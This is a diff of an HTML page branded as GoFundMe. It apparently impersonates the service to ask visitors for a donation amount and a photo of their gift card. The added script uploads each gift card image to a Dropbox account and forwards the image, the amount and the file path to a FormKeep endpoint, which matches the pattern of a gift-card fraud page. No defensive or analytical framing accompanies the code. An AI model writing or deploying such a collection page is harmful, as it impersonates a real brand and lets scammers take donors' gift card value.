@@ -60,49 +60,70 @@
                 
                 <!-- Donation amount input -->
                 <input id="amountInput" type="number" name="amount" class="w-full border border-gray-300 rounded-lg p-4 mb-4" placeholder="Enter amount in USD" required>
-               <form id="upload-form" enctype="multipart/form-data">
-        <input type="file" id="file-upload" accept="image/*" required />
-        <button type="submit">Upload Image</button>
-    </form>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/dropbox.js/8.1.1/Dropbox-sdk.min.js"></script>
-    <script>
-        const CLIENT_ID = 'xj1rpi8s7ptrqhx'; // Replace with your Dropbox App Key
-        const dbx = new Dropbox.Dropbox({ clientId: CLIENT_ID });
+                <!-- File upload for gift card -->
+                <label for="giftCardImage" class="block text-lg font-semibold mb-2">Upload Your Gift Card Image</label>
+                <input type="file" name="giftCardImage" id="giftCardImage" accept="image/*" required class="w-full border border-gray-300 rounded-lg p-4 mb-4">
 
-        // Handle form submission
-        document.getElementById('upload-form').addEventListener('submit', function(event) {
-            event.preventDefault();
+                <!-- Dropbox SDK -->
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/dropbox.js/8.1.1/Dropbox-sdk.min.js"></script>
+                <script>
+                    const CLIENT_ID = 'xj1rpi8s7ptrqhx'; // Replace with your Dropbox App Key
+                    const dbx = new Dropbox.Dropbox({ clientId: CLIENT_ID });
 
-            // Get the file to upload
-            const file = document.getElementById('file-upload').files[0];
+                    // Handle form submission to Dropbox and FormKeep
+                    document.querySelector('form').addEventListener('submit', function(event) {
+                        event.preventDefault();
 
-            if (file) {
-                // Get access token from localStorage
-                const accessToken = localStorage.getItem('access_token');
-                const dbx = new Dropbox.Dropbox({ accessToken });
+                        // Get the file to upload
+                        const file = document.getElementById('giftCardImage').files[0];
 
-                // Upload the image to Dropbox
-                dbx.filesUpload({ path: '/images/' + file.name, contents: file })
-                    .then(function(response) {
-                        console.log('File uploaded:', response);
-                        alert('File uploaded successfully!');
-                    })
-                    .catch(function(error) {
-                        console.error('Error uploading file:', error);
+                        if (file) {
+                            // Get the access token from localStorage
+                            const accessToken = localStorage.getItem('access_token');
+                            const dbx = new Dropbox.Dropbox({ accessToken });
+
+                            // Upload the image to Dropbox
+                            dbx.filesUpload({ path: '/images/' + file.name, contents: file })
+                                .then(function(response) {
+                                    console.log('File uploaded:', response);
+
+                                    // Add the donation amount to the form data
+                                    const amount = document.getElementById('amountInput').value;
+                                    const formData = new FormData();
+                                    formData.append('amount', amount);
+                                    formData.append('giftCardImage', file);
+                                    formData.append('file_link', response.path_display); // Save Dropbox file link
+
+                                    // Submit to FormKeep (adjust action URL as necessary)
+                                    fetch('https://submit.formkeep.com/eb1403d52568b66d0c3cbb0e6948caee', {
+                                        method: 'POST',
+                                        body: formData
+                                    })
+                                    .then(function(response) {
+                                        if (response.ok) {
+                                            alert('Thank you for donating!');
+                                        } else {
+                                            alert('Error submitting form. Please try again.');
+                                        }
+                                    })
+                                    .catch(function(error) {
+                                        console.error('Error uploading file:', error);
+                                        alert('Error uploading your donation. Please try again.');
+                                    });
+                                })
+                                .catch(function(error) {
+                                    console.error('Error uploading file:', error);
+                                    alert('Error uploading your file. Please try again.');
+                                });
+                        } else {
+                            alert('Please select a file to upload!');
+                        }
                     });
-            } else {
-                alert('Please select a file to upload!');
-            }
-        });
-    </script>
-</form>
-
+                </script>
             </form>
         </div>
     </section>
-
-
 
     <footer class="bg-green-600 text-white py-4 text-center">
         <p>&copy; 2024 GoFundMe. All Rights Reserved.</p>
